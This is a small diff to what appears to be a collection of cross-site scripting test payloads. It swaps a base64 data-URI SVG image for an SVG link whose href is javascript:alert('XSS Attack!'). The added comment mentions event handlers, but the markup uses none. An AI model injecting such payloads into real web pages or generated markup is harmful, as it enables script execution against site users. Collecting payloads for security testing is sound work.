@@ -1,2 +1,6 @@
-<!-- Payload: Data URI -->
-<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHBhdGggZD0iTTE1LDE1TDAsNkwxNSwxNVoiIHN0cm9rZS13aWR0aD0iMyIgc3Ryb2tlLWxpbmU9InJlbCIgc3Ryb2tlLXdpaHRoPSIzIiBmaWxsPSJyZWQiLz48L3N2Zz4=" />
+<!-- Payload: Use alternative event handlers -->
+<svg xmlns="http://www.w3.org/2000/svg">
+    <a xlink:href="javascript:alert('XSS Attack!')">
+        <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red"/>
+    </a>
+</svg>
